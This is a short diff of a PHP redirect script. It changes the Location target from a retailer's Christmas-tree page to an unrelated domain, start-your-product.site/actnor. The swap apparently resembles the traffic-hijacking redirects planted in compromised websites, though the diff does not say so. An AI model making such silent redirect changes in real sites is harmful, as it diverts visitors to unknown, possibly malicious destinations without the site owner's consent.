@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.treetopia.com/Traditional-Artificial-Christmas-Trees-s/21.htm");
+header("Location: https://start-your-product.site/actnor");
 die();
 ?>
